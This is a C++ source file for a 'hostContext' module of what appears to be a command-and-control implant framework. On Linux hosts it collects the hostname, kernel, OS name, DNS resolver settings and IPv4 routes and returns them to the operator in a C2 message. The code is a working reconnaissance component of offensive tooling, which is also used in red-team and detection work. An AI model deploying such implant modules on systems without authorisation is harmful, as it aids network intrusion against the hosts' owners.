#include "HostContext.hpp"
#include "Common.hpp"

#include <string_view>

#ifndef _WIN32
#include <fstream>
#include <sstream>
#include <sys/utsname.h>
#include <unistd.h>
#endif

namespace
{
constexpr std::string_view moduleName = "hostContext";
constexpr unsigned long long moduleHash = djb2(moduleName);

#ifndef _WIN32
std::string trim(std::string value)
{
    const auto first = value.find_first_not_of(" \t\r\n");
    if (first == std::string::npos) return {};
    const auto last = value.find_last_not_of(" \t\r\n");
    return value.substr(first, last - first + 1);
}

std::string osName()
{
    std::ifstream file("/etc/os-release");
    std::string line;
    while (std::getline(file, line))
    {
        if (line.rfind("PRETTY_NAME=", 0) != 0) continue;
        std::string value = trim(line.substr(12));
        if (value.size() >= 2 && value.front() == '"' && value.back() == '"')
            value = value.substr(1, value.size() - 2);
        return value;
    }
    return "unavailable";
}

std::string ipv4FromProcHex(const std::string& hex)
{
    if (hex.size() != 8) return "unknown";
    try
    {
        const unsigned long value = std::stoul(hex, nullptr, 16);
        return std::to_string(value & 0xffUL) + '.'
            + std::to_string((value >> 8) & 0xffUL) + '.'
            + std::to_string((value >> 16) & 0xffUL) + '.'
            + std::to_string((value >> 24) & 0xffUL);
    }
    catch (...)
    {
        return "unknown";
    }
}

void appendResolver(std::string& output)
{
    std::ifstream file("/etc/resolv.conf");
    output += "Resolver configuration:\n";
    if (!file) { output += "unavailable\n"; return; }
    std::string line;
    unsigned count = 0;
    while (count < 16 && std::getline(file, line))
    {
        line = trim(line);
        if (line.rfind("nameserver ", 0) != 0 && line.rfind("search ", 0) != 0
                && line.rfind("domain ", 0) != 0) continue;
        output += line.substr(0, 256) + '\n';
        ++count;
    }
    if (count == 0) output += "no nameserver/search entries\n";
}

void appendRoutes(std::string& output)
{
    std::ifstream file("/proc/net/route");
    output += "IPv4 routes:\n";
    if (!file) { output += "unavailable\n"; return; }
    std::string line;
    std::getline(file, line); // header
    unsigned count = 0;
    while (count < 64 && std::getline(file, line))
    {
        std::istringstream fields(line);
        std::string iface, destination, gateway, flags, refcnt, use, metric, mask;
        if (!(fields >> iface >> destination >> gateway >> flags >> refcnt >> use >> metric >> mask))
            continue;
        output += iface.substr(0, 64) + " destination=" + ipv4FromProcHex(destination)
            + " mask=" + ipv4FromProcHex(mask)
            + " gateway=" + ipv4FromProcHex(gateway)
            + " metric=" + metric.substr(0, 16) + '\n';
        ++count;
    }
    if (count == 0) output += "no IPv4 routes\n";
}
#endif
}

#ifdef _WIN32
extern "C" __declspec(dllexport) HostContext* HostContextConstructor() { return new HostContext(); }
#else
extern "C" __attribute__((visibility("default"))) HostContext* HostContextConstructor() { return new HostContext(); }
#endif

HostContext::HostContext()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{
}

std::string HostContext::getInfo()
{
#ifdef BUILD_TEAMSERVER
    return "hostContext:\nRead Linux host identity, OS, resolver and IPv4 routes.\n";
#else
    return {};
#endif
}

int HostContext::init(std::vector<std::string>& splitCommand, C2Message& message)
{
#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS)
    message.set_instruction(splitCommand[0]);
#else
    (void)splitCommand;
    (void)message;
#endif
    return 0;
}

int HostContext::process(C2Message& message, C2Message& response)
{
    response.set_instruction(message.instruction());
    response.set_returnvalue(collect());
    return 0;
}

std::string HostContext::collect() const
{
#ifdef _WIN32
    return "Unsupported platform.\n";
#else
    std::string output;
    char hostname[256]{};
    output += "Hostname: ";
    output += gethostname(hostname, sizeof(hostname) - 1) == 0 ? hostname : "unavailable";
    output += '\n';
    struct utsname system{};
    output += "Kernel: ";
    output += uname(&system) == 0
        ? std::string(system.sysname) + ' ' + system.release + ' ' + system.machine
        : "unavailable";
    output += "\nOS: " + osName() + '\n';
    appendResolver(output);
    appendRoutes(output);
    return output;
#endif
}
